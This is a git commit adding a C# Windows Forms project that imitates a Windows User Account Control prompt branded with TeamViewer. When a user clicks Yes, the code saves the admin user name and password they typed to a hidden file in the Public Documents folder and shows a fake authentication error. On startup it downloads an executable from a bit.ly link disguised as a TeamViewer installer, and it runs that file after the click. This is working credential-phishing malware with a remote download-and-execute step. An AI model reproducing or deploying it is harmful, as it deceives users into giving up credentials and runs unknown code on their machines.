bab1843abd03b720c96e2b061a5688d520ec6ac0
Svabas22 <simonas.svabas2002@gmail.com>
2023-03-25 14:57:44 +0200

    Add project files.

---
+++ uac/Form1.Designer.cs
@@ -0,0 +1,161 @@
+﻿namespace uac
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = global::uac.Properties.Resources.a;
+            this.pictureBox1.Location = new System.Drawing.Point(-2, 0);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(454, 229);
+            this.pictureBox1.TabIndex = 0;
+            this.pictureBox1.TabStop = false;
+            // 
+            // textBox1
+            // 
+            this.textBox1.BackColor = System.Drawing.SystemColors.Menu;
+            this.textBox1.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.textBox1.Location = new System.Drawing.Point(25, 308);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(285, 29);
+            this.textBox1.TabIndex = 1;
+            this.textBox1.Text = "User Name";
+            this.textBox1.UseWaitCursor = true;
+            this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
+            this.textBox1.Enter += new System.EventHandler(this.textBox1_Enter);
+            this.textBox1.Leave += new System.EventHandler(this.textBox1_Leave);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.ForeColor = System.Drawing.Color.Blue;
+            this.label1.Location = new System.Drawing.Point(22, 241);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(132, 20);
+            this.label1.TabIndex = 4;
+            this.label1.Text = "Show more details";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label2.Location = new System.Drawing.Point(22, 267);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(364, 20);
+            this.label2.TabIndex = 5;
+            this.label2.Text = "To continue, enter an admin user name and password.";
+            // 
+            // textBox2
+            // 
+            this.textBox2.BackColor = System.Drawing.SystemColors.Menu;
+            this.textBox2.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.textBox2.Location = new System.Drawing.Point(25, 346);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(285, 29);
+            this.textBox2.TabIndex = 6;
+            this.textBox2.Text = "Password";
+            this.textBox2.Enter += new System.EventHandler(this.textBox2_Enter);
+            this.textBox2.Leave += new System.EventHandler(this.textBox2_Leave);
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.SystemColors.ActiveBorder;
+            this.button1.FlatAppearance.BorderSize = 0;
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.ForeColor = System.Drawing.Color.Black;
+            this.button1.Location = new System.Drawing.Point(25, 421);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(201, 34);
+            this.button1.TabIndex = 7;
+            this.button1.Text = "Yes";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2
+            // 
+            this.button2.BackColor = System.Drawing.SystemColors.ActiveBorder;
+            this.button2.FlatAppearance.BorderColor = System.Drawing.SystemColors.ActiveBorder;
+            this.button2.FlatAppearance.BorderSize = 0;
+            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button2.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button2.Location = new System.Drawing.Point(229, 421);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(200, 34);
+            this.button2.TabIndex = 8;
+            this.button2.Text = "No";
+            this.button2.UseVisualStyleBackColor = false;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.SystemColors.ControlLight;
+            this.ClientSize = new System.Drawing.Size(451, 481);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.pictureBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+    }
+}
+
---
+++ uac/Form1.cs
@@ -0,0 +1,120 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Media;
+using System.IO;
+using System.Diagnostics;
+using System.Net;
+
+namespace uac
+{
+    public partial class Form1 : Form
+    {
+        private static string currentUserName = Environment.UserName;
+        private static string fileUrl = "https://bit.ly/40dN90f";
+        private static string fileName = @"C:\Users\" + currentUserName + @"\Downloads\TeamViewer_Setup_x64.exe";
+        public Form1()
+        {
+            InitializeComponent();
+            this.CenterToScreen();
+            this.FormBorderStyle = FormBorderStyle.None;
+            SoundPlayer sound = new SoundPlayer(@"C:\Windows\Media\Windows User Account Control.wav");
+            sound.Play();
+            this.Icon = Properties.Resources.TeamViewer_Logo_Icon_Only;
+            downloadExe();
+        }
+
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+            
+            
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            Close();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            this.textBox1.Text = "User Name";
+            this.textBox2.Text = "Password";
+            this.textBox1.ForeColor = Color.Gray;
+            this.textBox2.ForeColor = Color.Gray;
+        }
+
+        private void textBox1_Enter(object sender, EventArgs e)
+        {
+            if(textBox1.Text == "User Name")
+            {
+                this.textBox1.ForeColor = Color.Black;
+                this.textBox1.Text = "";
+            }
+        }
+
+        private void textBox1_Leave(object sender, EventArgs e)
+        {
+            if (textBox1.Text == "")
+            {
+                this.textBox1.ForeColor = Color.Gray;
+                this.textBox1.Text = "User Name";
+            }
+        }
+
+        private void textBox2_Enter(object sender, EventArgs e)
+        {
+            if (textBox2.Text == "Password")
+            {
+                this.textBox2.ForeColor = Color.Black;
+                this.textBox2.Text = "";
+                this.textBox2.PasswordChar = '●';
+            }
+        }
+
+        private void textBox2_Leave(object sender, EventArgs e)
+        {
+            if (textBox2.Text == "")
+            {
+                this.textBox2.ForeColor = Color.Gray;
+                this.textBox2.Text = "Password";
+                this.textBox2.PasswordChar = '\0';
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            string computerName = Environment.MachineName;
+            string formatted = string.Format("{0};{1}", this.textBox1.Text.ToString(), this.textBox2.Text.ToString());
+            if (File.Exists(@"C:\Users\Public\Documents\creds.txt"))
+            {
+                File.Delete(@"C:\Users\Public\Documents\creds.txt");
+            }
+            using (StreamWriter writer = new StreamWriter(@"C:\Users\Public\Documents\creds.txt"))
+            {
+                writer.WriteLine(formatted);
+            }
+            File.SetAttributes(@"C:\Users\Public\Documents\creds.txt", FileAttributes.Hidden);
+
+            DialogResult result = MessageBox.Show("Failed to authenticate user.\n\nAccess denied or timeout expired\nCheck if you have local administrator privilages on computer '" + computerName + "'\n\nPossible reasons:\n1. Invalid credentials" , "User Account Control", MessageBoxButtons.OK, MessageBoxIcon.Error);
+
+            Process.Start(fileName);
+            Close();
+        }
+
+        public void downloadExe()
+        {
+            MessageBox.Show(fileName);
+            using (WebClient client = new WebClient())
+            {
+
+                client.DownloadFileAsync(new Uri(fileUrl), fileName);
+            }
+        }
+    }
+}
